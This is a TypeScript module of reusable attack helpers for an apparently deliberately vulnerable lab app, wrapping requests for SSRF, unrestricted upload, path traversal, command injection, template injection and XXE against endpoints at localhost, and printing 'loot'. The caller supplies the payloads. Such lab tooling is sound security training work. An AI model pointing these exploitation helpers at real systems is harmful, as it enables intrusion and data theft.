// Reusable attacks for the "dangerous classes" cluster: SSRF (#12), unrestricted
// upload (#13), path traversal/LFI (#14), command injection (#15), SSTI (#16),
// XXE (#17). All are sandboxed to the container per §7 and demo planted decoys.

const BASE = process.env.KARTLY_URL ?? "http://localhost:4000";

function authHeaders(cookie: string, csrf?: string): Record<string, string> {
  const h: Record<string, string> = { Cookie: cookie };
  if (csrf) h["X-CSRF-Token"] = csrf;
  return h;
}

// #12 SSRF: coerce the server to fetch an internal URL; the bytes are saved to
// /uploads. Returns the avatar path the exfiltrated response now lives at.
export async function avatarFromUrl(cookie: string, csrf: string, url: string) {
  const res = await fetch(`${BASE}/api/me/avatar-url`, {
    method: "POST",
    headers: { ...authHeaders(cookie, csrf), "Content-Type": "application/json" },
    body: JSON.stringify({ url }),
  });
  const json = (await res.json().catch(() => ({}))) as { user?: { avatarUrl?: string } };
  return { status: res.status, avatarUrl: json.user?.avatarUrl ?? "" };
}

// Fetch any server path as raw text (e.g. an uploaded/exfiltrated file).
export async function getRaw(path: string) {
  const res = await fetch(`${BASE}${path}`);
  return { status: res.status, contentType: res.headers.get("content-type") ?? "", text: await res.text() };
}

// #13 unrestricted upload: upload an arbitrary file (name + content-type + bytes).
export async function uploadAvatar(
  cookie: string,
  csrf: string,
  filename: string,
  contentType: string,
  bytes: string,
) {
  const fd = new FormData();
  fd.append("image", new Blob([bytes], { type: contentType }), filename);
  const res = await fetch(`${BASE}/api/me/avatar`, {
    method: "POST",
    headers: authHeaders(cookie, csrf),
    body: fd,
  });
  const json = (await res.json().catch(() => ({}))) as { user?: { avatarUrl?: string } };
  return { status: res.status, avatarUrl: json.user?.avatarUrl ?? "" };
}

// #14 path traversal: fetch a file through the download endpoint.
export async function downloadFile(fileParam: string) {
  const res = await fetch(`${BASE}/download?file=${encodeURIComponent(fileParam)}`);
  return { status: res.status, text: await res.text() };
}

// #16 SSTI: set the seller announcement to a template payload, then read the store.
export async function setAnnouncement(cookie: string, csrf: string, template: string) {
  const res = await fetch(`${BASE}/api/seller/announcement`, {
    method: "POST",
    headers: { ...authHeaders(cookie, csrf), "Content-Type": "application/json" },
    body: JSON.stringify({ template }),
  });
  return { status: res.status };
}
export async function getStore(sellerId: string) {
  const res = await fetch(`${BASE}/store/${sellerId}`);
  return { status: res.status, text: await res.text() };
}

// #15 command injection: call the admin report exporter with an injected label.
export async function adminExport(cookie: string, csrf: string, label: string) {
  const res = await fetch(`${BASE}/api/admin/export`, {
    method: "POST",
    headers: { ...authHeaders(cookie, csrf), "Content-Type": "application/json" },
    body: JSON.stringify({ label }),
  });
  const json = (await res.json().catch(() => ({}))) as { output?: string };
  return { status: res.status, output: json.output ?? "" };
}

// #17 XXE: bulk-import products from XML carrying an external entity.
export async function importXml(cookie: string, csrf: string, xml: string) {
  const res = await fetch(`${BASE}/api/seller/products/import-xml`, {
    method: "POST",
    headers: { ...authHeaders(cookie, csrf), "Content-Type": "application/json" },
    body: JSON.stringify({ xml }),
  });
  const json = (await res.json().catch(() => ({}))) as { products?: { name: string }[] };
  return { status: res.status, products: json.products ?? [] };
}

export function printLoot(title: string, loot: string) {
  // eslint-disable-next-line no-console
  console.log(`\n  🩸 ${title}\n${loot}\n`);
}
